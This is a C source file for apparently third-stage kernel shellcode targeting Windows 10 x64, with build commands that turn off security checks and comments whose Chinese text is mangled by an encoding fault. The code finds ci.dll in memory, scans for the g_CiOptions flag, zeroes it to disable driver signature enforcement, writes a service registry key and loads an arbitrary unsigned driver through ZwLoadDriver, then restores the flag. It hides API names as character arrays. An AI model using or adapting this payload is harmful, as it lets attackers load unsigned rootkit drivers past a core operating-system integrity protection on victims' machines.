// Win10X64Stage3.c : �����׶ε�ShellCode
//������б����� cl.exe �� 2017 �汾������װ�� Visual Studio 2017��
//����Ҫ��������ʾ����ת����C:\Program Files (x86)\Microsoft Visual Studio\2017\Professional(�����Լ��������)\VC\Auxiliary\Build 
//�������� ��vcvars32.bat�� ���� x86 ����� vcvars64.bat ���� x64 ���롣

//cl.exe https://learn.microsoft.com/zh-cn/cpp/build/reference/gs-buffer-security-check?view=msvc-170
//cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FA /W4 /Zl /c /TC /Win10X64Stage3.c
//01 :�Ż�ʹ�����Ŀ�ִ�д�����С����
//Os :����������С�Ŀ�ִ�д���
//Oy :��ֹ���ö�ջ�ﴴ��ջָ��
//FD :�����ļ����໥������Ϣ
//MT :ʹ�� LIBCMT.lib�������Դ������߳̿�ִ���ļ�
//GS-:���ð�ȫ���
//J  :Ĭ�� char ������ unsigned
//GR-:���� C++ RTTI
//W4 :���þ���ȼ� 1-4
//Zl :ʡ�� .OBJ �е�Ĭ�Ͽ���
//c  :ֻ���벻����
//TC :�������ļ�����Ϊ .c
///kernel:�����������������������ں���ִ�еĶ������ļ���

//ml64.exe https://learn.microsoft.com/zh-cn/cpp/assembler/masm/ml-and-ml64-command-line-reference?view=msvc-170
//ml64.exe Win10X64Inject.asm /Fe Win10X64Inject.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main Win10X64Stage3.obj
//link ����ѡ��
//NODEFAULTLIB (���Կ�)
///RELEASE	�� .exe ��ͷ������У���
//MACHINE	ָ��Ŀ��ƽ̨��
//ENTRY	������ʼ��ַ

#include "Win10X64Stage3.h"

BOOLEAN WX64STAGE3LoadDriver(_In_ PKMJDATA pk);

// http://alter.org.ua/docs/nt_kernel/procaddr/
DWORD64 WX64STAGE3KernelGetModuleBase(_In_ PKMJDATA pk, _In_ LPSTR szModuleName)
{
	PBYTE pbSystemInfoBuffer;
	SIZE_T cbSystemInfoBuffer = 0;
	PSYSTEM_MODULE_INFORMATION_ENTRY pSME;
	DWORD64 i, qwAddrModuleBase = 0;
	pk->fn.FUN_ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, (PULONG)&cbSystemInfoBuffer);
	if (!cbSystemInfoBuffer) { return 0; }
	pbSystemInfoBuffer = (PBYTE)pk->fn.FUN_ExAllocatePool(0, cbSystemInfoBuffer);
	if (!pbSystemInfoBuffer) { return 0; }
	if (0 == pk->fn.FUN_ZwQuerySystemInformation(SystemModuleInformation, pbSystemInfoBuffer, (ULONG)cbSystemInfoBuffer, (PULONG)&cbSystemInfoBuffer)) {
		pSME = ((PSYSTEM_MODULE_INFORMATION)(pbSystemInfoBuffer))->Module;
		for (i = 0; i < ((PSYSTEM_MODULE_INFORMATION)(pbSystemInfoBuffer))->Count; i++) {
			if (0 == pk->fn.FUN_stricmp(szModuleName, pSME[i].ImageName + pSME[i].PathLength)) {
				qwAddrModuleBase = (DWORD64)pSME[i].Base;
			}
		}
	}
	if (pbSystemInfoBuffer) { pk->fn.FUN_ExFreePool(pbSystemInfoBuffer); }
	return qwAddrModuleBase;
}

//https://www.caldow.cn/archives/4193
//https://www.163.com/dy/article/HIM2HP0S0511CJ6O.html
//��windows10 ��window7 ����λ�ò�һ����
//windows10 ��->c:\windows\System32\CI.dll!g_CiOptions
//windows7 ��->c:\windows\System32\ntoskrnl.exe!g_CiEnabled
//Windows �ϵ�����ǩ��У���ɵ����������ļ� ci.dll(= > %WINDIR%\System32\) ����
//�� Windows 8 ֮ǰ��CI ����һ��ȫ�ֲ������� g_CiEnabled������������ǩ�����ǽ���ǩ�����ⶼ�ǲ��������ġ�
//�� Windows 8 + �У�g_CiEnabled ����һ��ȫ�ֱ��� g_CiOptions �滻��
//���Ǳ�־����ϣ�����Ҫ���� 0x0 = ���á�0x6 = ���á�0x8 = ����ģʽ��
//windows10(19044)�У��ǵ����ε���call(0xE8),����19044��18363���벻ͬ
DWORD64 WX64STAGE3GetCiEnabledAddr(DWORD64 CIModuleAddr)
{
	DWORD64 qwA;
	DWORD i = 0, j = 0;
	CHAR CiInitialize[] = { 'C','i','I','n','i','t','i','a','l','i','z','e', 0 };
	qwA = WX64STAGE3GetProcAddress(CIModuleAddr, CiInitialize);
	if (!qwA) {
		return 0;
	}
	do {
		// JMP��CiInitialize�Ӻ��������Ӳ����Ҫ���ݲ�ͬ��ϵͳƥ�䣬������win10 1909����
		if (*(PWORD)(qwA + i) == 0xCD8B) {
			qwA = qwA + i + 7 + *(PLONG)(qwA + i + 3);
			do {
				// Scan for MOV to g_CiEnabled
				if (*(PUSHORT)(qwA + j) == 0x0D89) {
					return qwA + j + 6 + *(PLONG)(qwA + j + 2);
				}
				j++;
			} while (j < 256);
			return 0;
		}
		i++;
	} while (i < 128);
	return 0;
}
int MyStricmp(const char *dst, const char *src)
{
	int ch1, ch2;
	do
	{
		if (((ch1 = (unsigned char)(*(dst++))) >= 'A') && (ch1 <= 'Z'))

			ch1 += 0x20;

		if (((ch2 = (unsigned char)(*(src++))) >= 'A') && (ch2 <= 'Z'))

			ch2 += 0x20;

	} while (ch1 && (ch1 == ch2));

	return(ch1 - ch2);

}

DWORD64 WX64STAGE3GetProcAddress(_In_ DWORD64 VmModuleBase, _In_ CHAR* ProcName)
{
	PDWORD RVAAddrNames = NULL;
	PDWORD RVAAddrFunctions = NULL;
	PWORD NameOrdinals = NULL;
	DWORD FnIdx = 0;
	LPSTR sz;
	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)VmModuleBase;
	PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)(VmModuleBase + DosHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY ExpDir = (PIMAGE_EXPORT_DIRECTORY)(NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + VmModuleBase);
	RVAAddrNames = (PDWORD)(VmModuleBase + ExpDir->AddressOfNames);
	NameOrdinals = (PWORD)(VmModuleBase + ExpDir->AddressOfNameOrdinals);
	RVAAddrFunctions = (PDWORD)(VmModuleBase + ExpDir->AddressOfFunctions);
	for (DWORD i = 0; i < ExpDir->NumberOfNames; i++) {

		sz = (LPSTR)(VmModuleBase + RVAAddrNames[i]);
		if (MyStricmp(ProcName, sz) == 0)
		{
			FnIdx = NameOrdinals[i];
			if (FnIdx >= ExpDir->NumberOfFunctions) {
				return 0;
			}
			return VmModuleBase + RVAAddrFunctions[FnIdx];
		}
	}
	return 0;
}

VOID WX64STAGE3MainLoop(PKMJDATA pk)
{
	DWORD64 IdleCount = 0;
	LONGLONG llTimeToWait = -10000;
	while (TRUE)
	{
		pk->opStatus = 1;
		if (KMJ_COMPLETED == pk->op) { 
			IdleCount++;
			if (IdleCount > 10000000000) {
				pk->fn.FUN_KeDelayExecutionThread(KernelMode, FALSE, &llTimeToWait);
			}
			continue;
		}
		pk->opStatus = 2;
		if (KMJ_TERMINATE == pk->op) { // EXIT
			pk->opStatus = 0xf0000000;
			pk->Result = TRUE;
			pk->MAGIC = 0;
			pk->op = KMJ_COMPLETED;
			return;
		}
		if (KMJ_LOAD_DRIVER == pk->op)
		{
			pk->DataOut[0]=WX64STAGE3LoadDriver(pk);
		}
		pk->op = KMJ_COMPLETED;
		IdleCount = 0;
	}

}

VOID WX64STAGE3EntryPoint(PKMJDATA pk)
{
	DWORD64 RetAddr = 0;
	//�õ�����ĺ�����ַ
	CHAR C_KeDelayExecutionThread[] = { 'K','e','D','e','l','a','y','E','x','e','c','u','t','i','o','n','T','h','r','e','a','d',0 };
	RetAddr = *((PDWORD64)&pk->fn + FUN_KeDelayExecutionThread) = WX64STAGE3GetProcAddress(pk->KernelBaseAddr, C_KeDelayExecutionThread);
	if (!RetAddr) {
		return;
	}
	pk->MAGIC = KMJDATA_MAGIC;
	WX64STAGE3MainLoop(pk);	
}

//�����ļ����Ƿ���Ч
NTSTATUS WX64STAGE3DriverRegGetImagePath(_In_ PKMJDATA pk, _Out_ PUNICODE_STRING ImagePath)
{
	NTSTATUS nt;
	HANDLE hFile = NULL;
	IO_STATUS_BLOCK _io;
	OBJECT_ATTRIBUTES _oa;
	ANSI_STRING _sa;
	// ����ļ��Ƿ����
	pk->fn.FUN_RtlInitAnsiString(&_sa, pk->DataInStr);
	pk->fn.FUN_RtlCopyMemory(pk->DataOutStr, pk->DataInStr, 260);
	pk->fn.FUN_RtlAnsiStringToUnicodeString(ImagePath, &_sa, TRUE);
	pk->fn.FUN_RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));
	pk->fn.FUN_RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));
	InitializeObjectAttributes(&_oa, ImagePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	nt = pk->fn.FUN_ZwCreateFile(&hFile, GENERIC_READ, &_oa, &_io, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if (hFile) {
		pk->fn.FUN_ZwClose(hFile);
	}
	if (NT_ERROR(nt)) {
		pk->fn.FUN_RtlFreeUnicodeString(ImagePath);
		return nt;
	}
	return ERROR_SUCCESS;
}

//��ȡ����(���һ��\֮�������)������һ����null��β���ַ�����
LPWSTR WX64STAGE3DriverRegGetImageNameFromPath(LPWSTR wszSrc)
{
	DWORD i = 0, j = 0;
	while (wszSrc[i] != 0) {
		if (wszSrc[i] == '\\') {
			j = i + 1;
		}
		i++;
	}
	return &wszSrc[j];
}

BOOLEAN WX64STAGE3DriverRegDeleteCharFromPath(LPWSTR wszSrc)
{
	DWORD i = 0;
	while (wszSrc[i] != 0) {
		if (wszSrc[i] == '.') {
			wszSrc[i] = 0;
			return TRUE;
		}
		i++;
	}
	return FALSE;
}

BOOLEAN WX64STAGE3DriverRegRestoreCharFromPath(LPWSTR wszSrc)
{
	DWORD i = 0;
	while (wszSrc[i] != 0) {
		if (wszSrc[i+1] == 0) {
			wszSrc[i+1] = '.';
			return TRUE;
		}
		i++;
	}
	return FALSE;
}

//http://www.pnpon.com/article/detail-387.html
//��ע����������������ֵType(1) ָ���ñ�������һ���ں�ģʽ��������
//1��Type(1) ָ���ñ�������һ���ں�ģʽ��������
//2��Start(3) ָ��ϵͳӦ��̬װ�������������
//(��ֵ��CreateService�е�SERVICE_DEMAND_START������Ӧ�������ں�ģʽ��������ʱ����������ȷ����StartService�����򷢳�NET START������������������)
//http://www.pnpon.com/article/detail-115.html
//3��ErrorControl(1) ָ�����װ�����������ʧ�ܣ�ϵͳӦ�ǼǸô�����ʾһ����Ϣ��
VOID WX64STAGE3DriverRegSetServiceKeys(_In_ PKMJDATA pk, _In_ HANDLE hKeyHandle, _In_ PUNICODE_STRING pusImagePath)
{
	WCHAR WSZ_ErrorControl[] = { 'E', 'r', 'r', 'o', 'r', 'C', 'o', 'n', 't', 'r', 'o', 'l', 0 };
	WCHAR WSZ_ImagePath[] = { 'I', 'm', 'a', 'g', 'e', 'P', 'a', 't', 'h', 0 };
	WCHAR WSZ_Start[] = { 'S', 't', 'a', 'r', 't', 0 };
	WCHAR WSZ_Type[] = { 'T', 'y', 'p', 'e', 0 };
	DWORD dwValue0 = 0, dwValue1 = 1, dwValue3 = 3;
	UNICODE_STRING usErrorControl, usImagePath, usStart, usType;
	pk->fn.FUN_RtlInitUnicodeString(&usErrorControl, WSZ_ErrorControl);
	pk->fn.FUN_RtlInitUnicodeString(&usImagePath, WSZ_ImagePath);
	pk->fn.FUN_RtlInitUnicodeString(&usStart, WSZ_Start);
	pk->fn.FUN_RtlInitUnicodeString(&usType, WSZ_Type);
	pk->fn.FUN_ZwSetValueKey(hKeyHandle, &usStart, 0, REG_DWORD, (PVOID)&dwValue3, sizeof(DWORD)); // 3 = Load on Demand
	pk->fn.FUN_ZwSetValueKey(hKeyHandle, &usType, 0, REG_DWORD, (PVOID)&dwValue1, sizeof(DWORD)); // 1 = Kernel Device Driver
	pk->fn.FUN_ZwSetValueKey(hKeyHandle, &usErrorControl, 0, REG_DWORD, (PVOID)&dwValue0, sizeof(DWORD)); // 0 = Do not show warning
	pk->fn.FUN_ZwSetValueKey(hKeyHandle, &usImagePath, 0, REG_SZ, pusImagePath->Buffer, pusImagePath->Length + 2);
}


//���Դ���һ��ע������ZwLoadDriver����ʹ������������������
NTSTATUS WX64STAGE3DriverRegCreateService(_In_ PKMJDATA pk, _Out_ WCHAR ServicePath[MAX_PATH])
{
	NTSTATUS nt;
	WCHAR WSZ_ServicePathBase[] = { '\\', 'R', 'e', 'g', 'i', 's', 't', 'r', 'y', '\\',  'M', 'a', 'c', 'h', 'i', 'n', 'e', '\\', 'S', 'y', 's', 't', 'e', 'm', '\\', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'C', 'o', 'n', 't', 'r', 'o', 'l', 'S', 'e', 't', '\\', 'S', 'e', 'r', 'v', 'i', 'c', 'e', 's', '\\', 0 };
	UNICODE_STRING usRegPath, usImagePath;
	OBJECT_ATTRIBUTES _oaReg;
	LPWSTR wszImageName;
	HANDLE hKeyHandle;	
	nt = WX64STAGE3DriverRegGetImagePath(pk, &usImagePath);
	if (NT_ERROR(nt)) {
		return nt;
	}
	wszImageName = WX64STAGE3DriverRegGetImageNameFromPath(usImagePath.Buffer);
	pk->fn.FUN_RtlCopyMemory(ServicePath, WSZ_ServicePathBase, sizeof(WSZ_ServicePathBase) + 2);
	// create the reg key:��DriverTest.sys��������Ҫ����.sys�������

	if (!WX64STAGE3DriverRegDeleteCharFromPath(wszImageName)){
		return STATUS_INVALID_PARAMETER;
	}
	pk->fn.FUN_wcscat(ServicePath, wszImageName);
	pk->fn.FUN_RtlInitUnicodeString(&usRegPath, ServicePath);
	
	InitializeObjectAttributes(&_oaReg, &usRegPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	nt = pk->fn.FUN_ZwCreateKey(&hKeyHandle, KEY_ALL_ACCESS, &_oaReg, 0, NULL, REG_OPTION_VOLATILE, NULL);
	if (NT_SUCCESS(nt)) {
		//��ԭwszImageName
		if (!WX64STAGE3DriverRegRestoreCharFromPath(wszImageName)){
			return STATUS_INVALID_PARAMETER;
		}
		WX64STAGE3DriverRegSetServiceKeys(pk, hKeyHandle, &usImagePath);
	}
	pk->fn.FUN_RtlFreeUnicodeString(&usImagePath);
	pk->fn.FUN_ZwClose(hKeyHandle);
	return nt;
}

NTSTATUS WX64STAGE3DriverLoadByImagePath(_In_ PKMJDATA pk)
{
	NTSTATUS nt;
	WCHAR wszServicePath[MAX_PATH];
	UNICODE_STRING usServicePath;
	DWORD i;
	nt = WX64STAGE3DriverRegCreateService(pk, wszServicePath);
	if (NT_ERROR(nt)) {
		return nt;
	}
	for (i = 0; i < MAX_PATH; i++) {
		pk->DataOutStr[i] = (CHAR)wszServicePath[i];
	}
	pk->fn.FUN_RtlInitUnicodeString(&usServicePath, wszServicePath);
	return pk->fn.FUN_ZwLoadDriver(&usServicePath);
}

BOOLEAN WX64STAGE3LoadDriver(_In_ PKMJDATA pk)
{
	BOOLEAN bRet = FALSE;
	DWORD64 CIModuleAddr = 0;
	PDWORD64 CIModuleCiOpAddr = NULL;
	DWORD64 CIModuleCiOpOrig = 0;
	CHAR ci[] = { 'c', 'i', '.', 'd', 'l', 'l', 0 };
	do
	{
		if (NULL == pk) {
			break;
		}
		// û��Ҫ������ļ�������ֱ�ӷ���
		if (0 == pk->DataInStr[0]){
			break;
		}
		//�õ�CI��ַ
		CIModuleAddr = WX64STAGE3KernelGetModuleBase(pk, ci);
		if (!CIModuleAddr){
			break;
		}
		CIModuleCiOpAddr = (PDWORD64)WX64STAGE3GetCiEnabledAddr(CIModuleAddr);
		if (!CIModuleCiOpAddr) {
			break;
		}
		//����ԭʼֵ�����޸�
		CIModuleCiOpOrig = *CIModuleCiOpAddr;
		*CIModuleCiOpAddr = 0;  //0x0 = ���á�0x6 = ���á�0x8 = ����ģʽ
		//��������
		pk->DataOut[0] = WX64STAGE3DriverLoadByImagePath(pk);
		//��ԭ
		*CIModuleCiOpAddr = CIModuleCiOpOrig;
		bRet = TRUE;

	} while (FALSE);
	

	return bRet;
}